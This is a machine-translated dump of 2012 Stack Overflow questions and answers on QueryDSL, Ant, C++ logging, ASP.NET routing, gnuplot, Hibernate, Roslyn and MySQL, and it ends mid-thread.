我正在尝试使用 QueryDSL 从我的表中获取多个列的列表，并自动填充我的 DB 对象，就像旧手册中的这个示例：

```
List<CatDTO> catDTOs = query.from(cat)
    .list(EConstructor.create(CatDTO.class, cat.id, cat.name)); 
```

问题是看起来 EConstructor 类在 2.2.0 版本中被删除了，而我现在找到的所有示例都是这样的：

```
List<Object[]> rows = query.from(cat)
    .list(cat.id, cat.name); 
```

这迫使我手动将所有对象投射到我的 CatDTO 类中。

有没有其他选择？任何 EConstructor 替代方案？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-14T20:38:11.057

在 Querydsl 2.0 中，EConstructor 已替换为 ConstructorExpression。所以你的例子会变成

```
List<CatDTO> catDTOs = query.from(cat)
    .list(ConstructorExpression.create(CatDTO.class, cat.id, cat.name)); 
```

您还可以注释 CatDTO 构造函数并像这样查询

```
List<CatDTO> catDTOs = query.from(cat)
    .list(new QCatDTO(cat.id, cat.name)); 
```

或者，您可以使用 QTuple 投影，它提供了更通用的访问选项

```
List<Tuple> rows = query.from(cat)
    .list(new QTuple(cat.id, cat.name)); 
```

可以像这样通过它们的路径访问实际值

```
tuple.get(cat.id) 
```

和

```
tuple.get(cat.name) 
```

元组投影可能会在 Querydsl 3.0 中用于多列投影而不是对象数组。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-02-10T17:16:22.070

使用 queryDSL 4 和 Java 8 流：

```
List<CatDTO> cats = new JPAQueryFactory(entityManager)
        .select(cat.id, cat.name)
        .from(cat)
        .fetch()
        .stream()
        .map(c -> new CatDTO(c.get(cat.id), c.get(cat.name)))
        .collect(Collectors.toList()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-11T06:27:24.173

另一种选择是使用类`Projections`。它将使用您作为参数传递的字段来构造对象，例如`EConstructor`. 例子：

```
List<CatDTO> catDTOs = query.from(cat)
    .list(Projections.bean(CatDTO.class, cat.id, cat.name)); 
```

参考：[http ://www.querydsl.com/static/querydsl/4.0.5/apidocs/com/querydsl/core/types/Projections.html](http://www.querydsl.com/static/querydsl/4.0.5/apidocs/com/querydsl/core/types/Projections.html)

# ant - Ant 使用 waitfor 来运行任务，直到设置了属性

> ID：12427672
> 
> 赞同：2
> 
> 时间：2012-09-14T15:33:13.963
> 
> 标签：ant, ant-contrib

我正在运行以下代码：

```
 <target name="_queryForRunningJobs">
   <ac:trycatch property="NODE_Reboot.failed">
     <try>

       <queryForRunningJob action="queryForRunningJob" jenkinsbaseURL="${targetRSSURL}" property="isRunningJobs" ignoreJobsLike="${ignore.jobs.like}"/>
       <echo message="${isRunningJobs}"/>
       <fail message="There is at least one job currently running on ${targetRSSURL}">
         <condition>
           <isset property="isRunningJobs"/>
         </condition>
       </fail>
     </try>

     <catch>
       <echo message="NODE_Reboot EXCEPTION: ${NODE_Reboot.failed}"/>
       <property name="reboot.failed.execution" value="${NODE_Reboot.failed"/>  
       <ac:var name="isRunningJobs" unset="true"/>
     </catch>

     <finally>
     </finally>
  </ac:trycatch>
</target> 
```

我想更改 try 块，以便 queryForRunningJob 每小时发生一次，例如 6 小时，直到 isRunningJobs 未设置，如果是我取消设置并等待一个小时。

我一直在尝试使用 waitFor，但我无法让它运行自定义任务并检查该属性是否未设置。

有谁知道如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-07-25T16:47:26.307

您可以使用`not`and`isset`中的条件`waitfor`来确保未设置变量。

至于检查是否`isRunningJobs`设置，您可以使用创建一个单独的线程`parallel`。

# c++ - Occasional SEG FAULT when ofstream goes out of scope

> ID：12427673
> 
> 赞同：1
> 
> 时间：2012-09-14T15:33:15.407
> 
> 标签：c++, segmentation-fault, ofstream

I seldom have a seg fault issue when the std::ofstream is going out of scope. I have the following structs in my Logger.h:

```
 struct LogRequest
        {
            std::string line;
            std::string prefix;
        };

        struct FileInfo
        {
            std::string name;
            std::ofstream ofs;
            int lines;
            std::string ToString()
            {
                return (name + " exists");
        }; 
```

And in Logger.cpp, I have following functions:

```
void Logger::Log(const std::string line, std::string prefix)
{
    pthread_mutex_lock(&mutex);
        if (file_map.find(prefix) == file_map.end())
        {
            OpenLogFile(prefix);
        }

        LogRequest* request = new LogRequest;
        request->line = line;
        request->prefix = prefix;
        message_queue.push_back(request);
    pthread_mutex_unlock(&mutex);
}

void Logger::OpenLogFile(const std::string& prefix)
{
    //get timestamp to use
    char timestamp[15];
    time_t now;
    time(&now);
    struct tm* current = localtime(&now);
    sprintf(timestamp, "%02u%02u%04u_%02u%02u%02u", (current->tm_mon+1),
        current->tm_mday,(1900 + current->tm_year), current->tm_hour,
        current->tm_min, current->tm_sec);

    FileInfo* info = new FileInfo;
    info->name = "logs/" + prefix + ".log_" + timestamp;
    info->ofs.open(info->name.c_str(), std::ios::out);
    info->lines = 0;

    file_map[prefix] = info;
}

void Logger::CloseLogFile(const std::string& prefix)
{
    delete file_map[prefix];
} 
```

And in a thread in Logger.cpp, I have...

```
void Logger::WriteToFile()
{
    std::map<std::string, FileInfo* >::iterator it;

    while(run)
    {
        char timestamp[16];
        time_t now;
        time(&now);
        struct tm* current = localtime(&now);
        sprintf(timestamp, "%02u%02u%04u|%02u%02u%02u|", (current->tm_mon+1),
            current->tm_mday,(1900 + current->tm_year), current->tm_hour,
            current->tm_min, current->tm_sec);

        pthread_mutex_lock(&mutex);
            for(it=file_map.begin(); it != file_map.end(); ++it)
            {
                if(it->second->lines > MAX_LINES)
                {
                    CloseLogFile(it->first);
                    OpenLogFile(it->first);
                }
                else
                {
                    int written = 0;

                    while(!message_queue.empty() && written < MESSAGES_PER_WRITE)
                    {
                        LogRequest* request = message_queue.front();
                        message_queue.pop_front();

                        std::string line(timestamp, 16);
                        line.append(request->line);

                        FileInfo* info = file_map[request->prefix];
                        info->ofs << line << std::endl;
                        info->lines++;
                        written++;
                        delete request;
                    }
                }
            }
        pthread_mutex_unlock(&mutex);

        usleep(1000);
    }
} 
```

The problem I am having is that SOMETIMES there is a seg fault that gets thrown in the destructor of std::ofstream ofs in FileInfo when I try to `CloseLogFile`. It works many times. And even before the SEG Fault occurs (through various cout statements) I have confirmed that the std::ofstream is good, has not failed, not reached eof, and is not bad. I have also confirmed that file_map[prefix] exists, and is present by outputting FileInfo's ToString() as well. These are all checked right before deletion in CloseLogFile.

My question concerns the reason for the SEG FAULT.

Also when the line gets outputted to the ofstream in WriteToFile(), is it fine if I delete the LogRequest object. As in, what exactly is happening in the `info->ofs << line << std::endl;` line?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:16:13.900

looks like your sprintf(timestamp...) call overwrites by one character (the null) which will cause undefined behavior. may or may not be your primary issue though since that's on a thread stack and your ofs is on the heap...

# eclipse - Eclipse 错误地打开了一些 .c 文件

> ID：12427679
> 
> 赞同：2
> 
> 时间：2012-09-14T15:33:27.560
> 
> 标签：eclipse

我正在使用压缩在文件夹中的 Eclipse 版本，因此我不必安装它，它在 Ubuntu 中运行，并且有问题的项目是 C 语言，不是我创建的。

大多数文件都可以正确打开，但其中一些文件是在带有两列行号的窗口中打开的，语法颜色与普通 *.c 文件略有不同（这是[http://imgur.com/qgd0N](http://imgur.com/qgd0N)的屏幕截图）。选项卡中可见的图标也不同（看起来像文本文件图标）。

你知道是什么原因造成的吗？

# .net - ShellRunAs 阻止读取 EXE 配置文件

> ID：12427681
> 
> 赞同：1
> 
> 时间：2012-09-14T15:33:32.333
> 
> 标签：.net, configuration

我正在使用 ShellRunAs 工具来启动一个 .NET 应用程序。此 .NET 应用程序使用应用程序配置文件。

当我尝试通过 ShellRunAs 运行应用程序时，无论我使用何种凭据，应用程序似乎都无法找到其配置文件。

我使用 Process Monitor 查看失败的文件访问，看起来使用 ShellRunAs 会导致 .NET 以某种方式查找已批准的 EXE.config 路径，而不是完整的 EXE.config 路径。

例如，当我正常启动我的应用程序时，我看到成功读取

> c:\程序文件 (x86)\我的公司\我的产品\MyLongApplicationName.exe.config

但是当我通过 ShellRunAs 启动时，我看到“未找到名称”条目：

> c:\程序文件（x86）\我的公司\我的产品\MyLong~1.exe.config

我在这里错过了什么吗？有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:45:23.053

这似乎是 ShellRunAs 和 GetShortPathName Win32 API 使用中的一个错误。

详细信息：http: [//forum.sysinternals.com/83-style-paths-for-modules-when-using-shellrunas_topic16246.html](http://forum.sysinternals.com/83-style-paths-for-modules-when-using-shellrunas_topic16246.html)

不幸的是，我唯一的解决方法是使用 8.3 命名方案的 exe.config 文件的副本。

修改 NTFS 注册表设置没有任何影响。

# c# - mvc3 异常路由

> ID：12427682
> 
> 赞同：0
> 
> 时间：2012-09-14T15:33:33.900
> 
> 标签：c#, asp.net-mvc-3

我有两条路线，除了默认：

```
routes.MapRoute("ShopDefault",
                "Shop/{id}/{action}",
                new { controller = "Shop" });
routes.MapRoute("Shop",
                "Shop/{id}/List/{categoryID}",
                new { controller = "Shop", action = "List"}); 
```

第一条路线完美运行，链接如`.../Shop/3/Index`,`.../Shop3/Messages`被正确处理。

但是对于第二条路线-`.../Shop/3/List/5`找不到类似的链接。有谁知道为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:35:06.770

您应该首先使用更明确的路线，路由引擎正在尝试匹配 ShopDefault 中的 Shop/Id/Action，然后可能会失败并在到达您更明确的 Shop 路线之前给您一个 404。

您应该以相反的顺序放置路线：

```
 routes.MapRoute(
                "Shop",
                "Shop/{id}/List/{categoryID}",
                new { controller = "Shop", action = "List"},
                new { id= @"\d+" }

            routes.MapRoute(
                "ShopDefault",
                "Shop/{id}/{action}",
                new { controller = "Shop" }); 
```

# delphi - firemonkey xe3 xe2 TPath

> ID：12427688
> 
> 赞同：0
> 
> 时间：2012-09-14T15:33:54.390
> 
> 标签：delphi, graphics, delphi-xe2, firemonkey, delphi-xe3

执行时遵循代码路径在 xe2 中是匀称的，但在 xe3 中是荒谬的。

```
procedure TForm2.Button1Click(Sender: TObject);
var
  Path : TPath;
begin
  Path := TPath.Create(Self);
  Path.Parent :=self;
  Path.Data.Data :=
  'M44.093,34.558v-2.83h12.793c4.131,0,8.301,3.841,8.301,8.969c0,4.375-2.829,7.607-6.49,8.462l8.106,8.105'+
    'c5.475-3.377,9.456-9.446,9.456-16.705c0-9.971-7.978-19.658-18.804-19.658H32.697v2.262L44.093,34.558z';

end; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T20:27:53.593

[文档](http://docwiki.embarcadero.com/Libraries/en/FMX.Types.TPathData.Data)说形状用逗号或空格分隔；您的代码都不使用。该文档不要求在字母和以下数字之间进行任何分隔，但我看到的所有示例都至少包含一个空格，而且我还读到[路径数据解析器在任何负数之前更喜欢空格](https://forums.embarcadero.com/message.jspa?messageID=437728)。

# java - 将 Angular js 与标签库一起使用

> ID：12427690
> 
> 赞同：0
> 
> 时间：2012-09-14T15:34:05.073
> 
> 标签：java, javascript, taglib, angularjs

我正在使用 Stripes MVC 文本标签，但如果我向其中添加 Angular 的 ng-model 则会出现异常，因为 taglib 中显然不支持该属性。有人知道处理这种情况的最佳做法吗？

```
<s:text name="name" ng-model="yourName" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T22:23:30.590

我对 Stripe 的标签库不是很熟悉，但从我看到他们的文档（[http://www.stripesframework.org/display/stripes/Tag+Library+Doc](http://www.stripesframework.org/display/stripes/Tag+Library+Doc)）来看，Stripes MVC 确实包含了他们的一个版本允许您使用所谓的“动态属性”的顶级域名：

> 然而，随着 AJAX 和 JavaScript 库的出现，有时希望在 HTML 标记中使用非 HTML 属性。由于上述原因，Stripes 包含两个可以使用的稍微不同的 TLD。标准的不允许在 HTML 标签中使用动态属性，应该在大多数情况下使用。第二个允许动态属性。可以（甚至推荐）在一页中使用两个 TLD。这样做将允许在可能的情况下使用标准库，并且仅在绝对必要的情况下使用动态属性。例如：

```
<%@ taglib prefix="s" uri="http://stripes.sourceforge.net/stripes.tld" %>
<%@ taglib prefix="d" uri="http://stripes.sourceforge.net/stripes-dynattr.tld" %>

<s:form action="/my/NewsSearch.action">
    <s:text name="keywords"/>
    <d:text name="publicationDate" dojoType="calendar"/>
    <s:submit name="search"/>
</s:form> 
```

所以我想你应该简单地导入 tlds 的“动态”版本并像这样使用它：

```
<%@ taglib prefix="d" uri="http://stripes.sourceforge.net/stripes-dynattr.tld" %>

<d:text name="name" ng-model="yourName" /> 
```

# javascript - 可以设置发生错误时显示的内联脚本标记的“文件名”吗？

> ID：12427691
> 
> 赞同：0
> 
> 时间：2012-09-14T15:34:08.193
> 
> 标签：javascript, onerror

如果我有一个像下面这样的内联脚本，其中函数 foo 未定义，我希望能够执行以下操作：

```
<script fileName='foo.js'>
  foo();
</script> 
```

并控制在错误控制台中显示什么文件名和/或控制在处理错误时将什么文件名传递给 window.onerror。例如，我想控制发送到的 url 参数

```
window.onerror = function (errMsg, url, line) {
    console.log(url); //would like this to output 'foo.js'
    console.log(event.filename);  //would like this to also output 'foo.js'
} 
```

默认情况下，除非脚本链接到外部文件，否则只会列出父 html 文件，但如果能够在不同的脚本标签中使用内联代码说明错误源自哪个脚本标签，那就太好了。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:40:51.763

据我所知，javascript 并没有注意到它在其中运行的 HTML 标记。像这样的东西对你有用吗？

```
<script>
  try {
    foo();
    // the rest of the code...
  } catch (err) {
    console.log('Caught error in foo.js');
    console.error(err);
  }
</script> 
```

If you're adding these scripts dynamically to the page you should be able to wrap them with this try/catch code and get the desired effect.

# objective-c - tableView.setScrollEnabled 为否，DidSelectRowAtIndex 没有响应

> ID：12427698
> 
> 赞同：0
> 
> 时间：2012-09-14T15:34:29.767
> 
> 标签：objective-c, uitableview, didselectrowatindexpath

如果 tableView.scrollEnabled = NO，则 didSelectRowAtIndexPath 不响应第一次触摸，而仅响应第二个选择行。你知道为什么吗？

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T13:37:23.103

确保您尚未实施

```
didDeselectRowAtIndexPath 
```

而不是实施

```
didSelectRowAtIndexPath 
```

# gnuplot - 根据多个数据块gnuplot的列值改变点颜色

> ID：12427704
> 
> 赞同：3
> 
> 时间：2012-09-14T15:34:49.137
> 
> 标签：gnuplot, rgb

[我的问题与这个](https://stackoverflow.com/questions/8717805/vary-point-color-in-gnuplot-based-on-value-of-one-column)问题非常相似，我从中学到了很多东西。但是，我正在处理多个数据块，如下所示：

```
1 2 3
4 5 6
7 8 0
4 3 0

4 5 7
2 3 0
4 5 0
5 6 7 
```

我正在像这样绘制它们：

```
plot "file.txt" index 0 u 1:2 w points pt 1,\
     "file.txt" index 1 u 1:2 w points pt 2 
```

它创建了 2 组不同的点，每组都有不同的颜色。现在，我的目标是修改此脚本，以便如果第 3 列数据为 0，则该点的颜色将变为黑色。我希望其他点保持它们当前的颜色（意味着彼此不同）。我已经这样做了：

```
set palette model RGB defined ( 0 'black', 1 'green' )
unset colorbox
plot file index 0 u 1:2:( $3 == 0 ? 0 : 1 ) w points pt 1 palette,\
     file index 1 u 1:2:( $3 == 0 ? 0 : 1 ) w points pt 2 palette 
```

这正是我想要的，当然这两个集合现在都以绿色绘制。有什么方法可以根据需要绘制黑色，但也可以使每个索引都具有不同的颜色？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T16:52:20.113

这就是特殊的“可变”颜色的用途：

```
plot 'test.dat' i 0 u 1:2:($3 == 0? 0:1) w p pt 1 lc variable,\
     'test.dat' i 1 u 1:2:($3 == 0? 0:2) w p pt 2 lc variable 
```

`variable`在这种情况下，使用第三列中给出的任何“样式索引”的颜色。我在第三列变量上设置过滤器，如果该列中的数据不为 0，它将第三列转换为常量（1 或 2）。

另一种不太直接的方法（由于您使用的是积分而有效）是：

```
plot 'test.dat' i 0 u 1:($3 == 0? 1/0: $2) w p pt 1 lc rgb "red",\
     'test.dat' i 0 u 1:($3 == 0? $2:1/0) w p pt 1 lc rgb "black,\
     'test.dat' i 1 u 1:($3 == 0? 1/0: $2) w p pt 1 lc rgb "green",\
     'test.dat' i 1 u 1:($3 == 0? $2:1/0) w p pt 1 lc rgb "black,\ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T16:03:14.373

它应该可以在调色板中定义一个额外的点：

```
set palette model RGB defined ( 0 'black', 1 'green', 2 'red')
unset colorbox
plot file index 0 u 1:2:( $3 == 0 ? 0 : 1 ) w points pt 1 palette,\
     file index 1 u 1:2:( $3 == 0 ? 0 : 2 ) w points pt 2 palette 
```

![在此处输入图像描述](../Images/64bc70b301f502babec8a57fca338dfd.png)

# android - 显示子对话框并使其线程安全的好方法

> ID：12427708
> 
> 赞同：0
> 
> 时间：2012-09-14T15:35:11.850
> 
> 标签：android, thread-safety

我有一个在对话框中显示一些可选项目的功能。它看起来像这样：

```
void showListDialog()
{
if (!_dialogIsOpen) {
    _dialogIsOpen = true;
    final Activity instance = this;

    runOnUiThread(new Runnable() 
    {
        public void run() 
        {   
            //Building the List to display

            AlertDialog alert = builder.create();
            alert.setOnDismissListener(new DialogInterface.OnDismissListener() 
            {                       
                @Override
                public void onDismiss(DialogInterface dialog) {
                    _dialogIsOpen = false;                          
                }
            });
            alert.show();
        }
    });
}
} 
```

现在我想让调用线程安全。现在您可以看到我对名为“_dialogIsOpen”的布尔字段进行了检查。该字段的访问不同步！

我的问题是我必须改变什么才能使这个函数线程安全。如果在 UiThread 中使用“可运行”是在 ui 上显示子对话框的好主意。

# wcf - IIS 托管的 WCF 服务创建了数千个临时文件夹

> ID：12427710
> 
> 赞同：3
> 
> 时间：2012-09-14T15:35:19.427
> 
> 标签：wcf, iis

我有一个 IIS 托管的 WCF 服务，昨天我发现在“临时 ASP.NET 文件”目录 (\234lkj\98734dc\assembly\tmp) 下的 5 个临时文件夹中创建了 66,235 个文件夹 (!!!) . 这些文件夹中的每一个都有服务所需的 dll 之一，它只需要 6 个，因此每个 dll 在不同的文件夹上被复制了大约 11,000 次。无论它们是否更改，IIS 都会从 bin 文件夹中复制它们吗？这是正常行为吗？是否有配置设置可以防止 IIS（或任何正在执行此操作的进程）不必要地复制 dll？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:05:17.227

.NET 使用 temp 文件夹来 JIT 编译来自其他服务的引用。.NET 需要一个地方来创建文件，然后编译此代码以最终使用该服务。现在，您看到这么多文件的原因可能与托管站点的应用程序池的设置方式有关。如果您查看应用程序池的高级设置，请查看分配了多少工作进程。每个工作进程都可以存在自己的内存，因此如果多个服务引用比比皆是，这将需要对多个文件夹进行 JIT 处理。此外，请检查以确保进程孤立未设置为打开。如果是这样，您的进程可能会留下文件，从而导致您看到的堆积。

# sql-server - SQL Server大事务回滚数据状态

> ID：12427712
> 
> 赞同：0
> 
> 时间：2012-09-14T15:35:33.767
> 
> 标签：sql-server, sql-server-2008, tsql

我有一个数据仓库程序，可以将数十个表从链接服务器下载并替换到本地数据库。每隔一段时间，代码就会卡在链接服务器上的一个表上，因为链接服务器上的表处于转换状态。我的假设是，由于整个过程被认为是一个事务提交，所以当过程卡住时，到目前为止，procudure 所做的任何更改都不会提交。但情况似乎正好相反，在程序卡住之前“下载”的表将在本地服务器上使用今天的版本进行更新。SQL Server 不应该在更改持久之前等待整个过程完成吗？

```
CREATE PROCEDURE MYIMPORT

AS

BEGIN

SET NOCOUNT ON

IF EXISTS (SELECT * FROM INFORMATION.SCHEMA.TABLES WHERE TABLE_NAME = 'TABLE1')
DROP TABLE TABLE1

SELECT COLUMN1, COLUMN2, COLUMN3 
INTO TABLE1
FROM OPENQUERY(MYLINK, 'SELECT COLUMN1, COLUMN2, COLUMN3 FROM TABLE1')

IF EXISTS (SELECT * FROM INFORMATION.SCHEMA.TABLES WHERE TABLE_NAME = 'TABLE2')
DROP TABLE TABLE2

SELECT COLUMN1, COLUMN2, COLUMN3 
INTO TABLE2
FROM OPENQUERY(MYLINK, 'SELECT COLUMN1, COLUMN2, COLUMN3 FROM TABLE2')
--IF THE PROCEDURE GETS STUCK HERE, THEN CHANGES TO TABLE1 WOULD HAVE BEEN MADE ON THE LOCAL SERVER WHILE NO CHANGES WOULD HAVE BEEN MADE TO TABLE3 ON THE LOCAL SERVER

IF EXISTS (SELECT * FROM INFORMATION.SCHEMA.TABLES WHERE TABLE_NAME = 'TABLE3')
DROP TABLE TABLE3

SELECT COLUMN1, COLUMN2, COLUMN3 
INTO TABLE3
FROM OPENQUERY(MYLINK, 'SELECT COLUMN1, COLUMN2, COLUMN3 FROM TABLE3')

END 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-02T13:51:06.330

SQL Server 将过程中的每个语句都视为一个单独的事务。需要添加“BEGIN TRANSACTION”和“COMMIT TRANSACTION”以将事务分组为一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T16:52:48.280

简而言之：存储过程！=事务。SQL Server 不会为存储过程创建单独的事务。您应该自己管理交易。请看这个链接：http: [//blog.sqlauthority.com/2010/06/02/sql-server-stored-procedure-and-transactions/](http://blog.sqlauthority.com/2010/06/02/sql-server-stored-procedure-and-transactions/)

# xcode - iOS 的 parsekit 与 armv7s 架构 iPhone 5 不兼容

> ID：12427714
> 
> 赞同：-3
> 
> 时间：2012-09-14T15:35:40.977
> 
> 标签：xcode, ios6, armv7

我为我的项目使用了适用于 iOS 的 parsekit，我已经安装了带有 iOS 6 的 Xcode 4.5 GM，并且在架构中自动为 iPhone 5 放置了 armv7s，但是 Xcode 给了我一个警告和错误：

```
libparsekit.a, file was built for archive which is not the architecture being linked (armv7s): 
```

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T19:25:51.177

[转到您的项目设置（或目标设置，如果它们在目标级别被覆盖），然后将架构设置从 armv7 armv7s 编辑到 armv7。](http://wanderingcoder.net/2012/09/16/no-armv7s-til-tested/)

# java - 如何组织我的抽象？

> ID：12427717
> 
> 赞同：0
> 
> 时间：2012-09-14T15:35:45.820
> 
> 标签：java, abstraction

我有一组我在课堂上拥有的功能。这些函数是一组最低通用性。

为了能够运行它，我需要生成某些信息，但是这些信息可以通过我的班级从两条路线之一到达。

我会试着总结一下我的情况......

可以说我有一个课程如下：

```
public class onHoliday(){

    private Object modeOfTravel;
    private Object location;

    public onHoliday(Object vehicle, Location GPScoords) {
    }
    private boolean haveFun() {
        //function to have fun, needs 4 people
    }
} 
```

让我们想象一下，我可以开车或骑自行车去度假。

我的`haveFun()`功能取决于我的车辆类型。

但只是松散的。我有另一个函数可以确定我的车辆类型并提取所需的值。例如，如果我发送一辆汽车，我可能会一次获得 4 个人，但如果我发送我的自行车，我至少需要 2 人才能获得所需的 4

我目前有两种选择：

1.  重载我的构造函数，以便我可以将两辆自行车或一辆汽车送入其中，然后我可以在我之前调用 2 个中间函数之一（例如获取我的 4 个人的姓名）`haveFun()`- 这就是我目前正在做的事情.

2.  将两个构造函数拆分为两个单独的类，并`haveFun()`在第三个类中重复我，这将成为我的另外两个类的对象。我的问题是我的中间函数只是几行代码，我不想将它们放在单独的文件中！（我总是把类放在单独的文件中！）

请注意，`haveFun()`除了这两个课程之外，我不需要，甚至不需要我的东西`onHoliday`（即，我没有机会`haveFun()`在周末或晚上做一些事情！）。

我虽然有关于放入`haveFun()`一个接口，但是只有一个方法的接口似乎有点毫无价值！即使那样，我也必须在两个课程中都使用该方法-一个用于自行车，另一个用于汽车！

我曾想过让我的`onHoliday`班级接受任何对象类型，但是我不希望有人意外地把船送到我的`onHoliday`班级（想象一下我不会游泳，所以它不会发生）。

重要的是要注意我的`onHoliday`课程是包私有的，并且是最终的。实际上，它只能通过其他类中的其他“私有方法”访问，并且本身只有私有方法。

编辑1：

我相信有人会建议我在将数据发送到 onHoliday() 类的类中处理这个问题。但是这个类（让我们称之为 travel() ）没有理由关心我正在使用的车辆类型，如果我这样做它确实关心，我只是将问题移到树上更远的另一个地方。现在必须重新编写我的所有中间类以访问汽车或自行车，目前他们只接受一个车辆对象，该对象有一个布尔开关来确定它是自行车还是汽车。

编辑2：

我刚刚有了另一个关于有一个抽象类来运行我的乐趣，然后在我的自行车或汽车类中将它作为一个“内部类”来实现。然后我可以访问我的自行车或班级的成员。这也有意义吗？

注意：我可能应该提一下，我必须确保在我的 onHoliday() 班级中我至少有 4 个人。

也许另一种思考方式是......

我可以获得一个多页文件，并从传递的页码列表中提取我需要的页面。或者我可以获得多个文件的列表。

在第一种情况下，我发送单个文件对象，在第二种情况下选择页码，我发送多个文件对象（预先选择我感兴趣的对象）。

事实上，这可能是一个更好的描述

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:51:39.307

你的代码示例有很多编译问题，但我想我知道你在问什么。如果您有一个抽象类`Vehicle`，则可以`haveFun()`在具体类中实现（即`Bike`，`Car`。您的 Holiday 类构造函数可以带一个`Vehicle`参数。无论它是什么类型的车辆，实现都在 Holiday 之外——而不是作为 Vehicle 的一部分。

您确实说过这是乐趣和车辆之间的松散耦合。如果在 Vehicle 中实现 haveFun 没有意义，那么只需在 Holiday 中使用一个方法来确定它 - 但是此方法的负面影响是您必须检查您拥有的每种类型的 Vehicle（即`if vehicle instanceof Bike then... else if....`）

如果你选择后者，你可以在构造函数中做任何事情。你会想要一个方法说 add's people and Vehicles `addPerson(Vehicle)`...。然后在添加完之后运行 isFun()。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:55:24.537

我可能会提出第三种方法：创建一个`Vehicle`处理人员移动的类。

```
public abstract class Vehicle {

    public void travel(Location location) {}

    public abstract int getCapacity();

    //etc.
}

public class Bicycle extends Vehicle {

    @Override
    public int getCapacity() { return 2; }

}

public class Car extends Vehicle {

    @Override
    public int getCapacity() { return 4; }

}

final class onHoliday {

    private Vehicle vehicle;

    public onHoliday(Vehicle vehicle) {
        this.vehicle = vehicle;
        haveFun();
    }
} 
```

然后，如果您有任何 a`Car`和 a`Bike`会做不同的事情（但他们都会做），只需将它们抽象放在`Vehicle`类中并覆盖。

# ios - iOS 和 CoreBluetooth 需要低能耗吗？

> ID：12427718
> 
> 赞同：2
> 
> 时间：2012-09-14T15:35:48.147
> 
> 标签：ios, bluetooth, core-bluetooth, bluetooth-lowenergy, mfi

我们正在制作 MFi 硬件和 iOS 应用程序。即使在某些事件发生时我们没有定期运行，我们也希望 BT 设备通知我们的应用程序。

我知道 CoreBluetooth API 是可以使用的 API，但无法确定该 API 是否仅适用于 BT 低功耗设备，或者它是否也适用于常规（当然是 MFi）BT 2.1 和更高版本的设备。

所以我的问题是：CoreBluetooth API 仅适用于蓝牙低功耗设备还是也适用于 2.1 设备？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-20T21:33:48.863

核心蓝牙专为蓝牙 LE（又名 BLE）、蓝牙 4.0 和智能蓝牙而设计。

核心蓝牙不适用于较旧的经典蓝牙设备。这些需要通过 Apple 的 MFi 程序提供的特殊 API 和硬件。

# hibernate - 如何从休眠查询返回单个结果对象？

> ID：12427725
> 
> 赞同：19
> 
> 时间：2012-09-14T15:36:13.940
> 
> 标签：hibernate

查询执行是否总是必须返回一个列表？如果我确定它只会返回一个对象，我该如何替换下面的代码？

```
@Override
    public List<DocInfo> findAllByDocId(String docId)
    {
        Query q = getCurrentSession().createQuery("from DocInfo item where item.id = :docId");
        q.setString("docId", docId);
        List<DocInfo> docInfoList = q.list();
        return docInfoList;
    } 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-14T15:40:24.137

如果我没记错的话，您可以将[Query#uniqueResult()与 Hibernate 一起使用。](http://docs.jboss.org/hibernate/orm/3.5/api/org/hibernate/Query.html#uniqueResult%28%29)我认为这就是你要找的。在这种情况下，`NonUniqueResultException`如果查询返回的行不止一行，则必须在代码中处理。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-14T15:43:31.340

您可以使用

```
query.getSingleResult(); 
```

当您完全确定查询将只返回一行时，我正在谈论

```
import javax.persistence.Query; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T17:21:18.377

如果您是通过 id (pk) 加载的，就像您在这里一样，您真的应该使用 Session.load/Session.get 来代替。

# visual-studio - Roslyn 中的对话窗口

> ID：12427727
> 
> 赞同：3
> 
> 时间：2012-09-14T15:36:16.713
> 
> 标签：visual-studio, roslyn

我想在 Visual Studio 中使用 Roslyn 实现重命名重构。为此，我希望用户输入将赋予所选变量的所需名称。如何提示用户编写文本？有没有办法显示带有输入的对话框窗口？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:07:51.693

Roslyn 没有提供它自己的特定方法来做到这一点。您可能想要创建一个 VS 命令，并使用`IVsUIShell`来显示对话框。

# mysql - 两个选择查询之间的 MySQL 差异

> ID：12427729
> 
> 赞同：0
> 
> 时间：2012-09-14T15:36:20.047
> 
> 标签：mysql, civicrm

我有两个返回电话号码列的 mysql 查询。我想最终得到一个列表中的电话号码列表，但不在另一个列表中。

所以我有两个查询是：

```
SELECT phone
FROM civicrm_phone phone
LEFT JOIN civicrm_participant participant 
    ON phone.contact_id = participant.contact_id
WHERE phone.is_primary = 1
    AND participant.id IS NULL 
```

和

```
SELECT phone
FROM civicrm_phone phone
LEFT JOIN civicrm_participant participant 
    ON phone.contact_id = participant.contact_id
WHERE phone.is_primary = 1
    AND participant.id IS NOT NULL 
```

在有人问之前，上述两个查询并没有提供互斥的结果（基于最后一个 WHERE 语句使用 IS NULL 和 IS NOT NULL），因为我们在数据库中有使用相同电话号码的相关个人，但不必须都有一个参与者.id。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
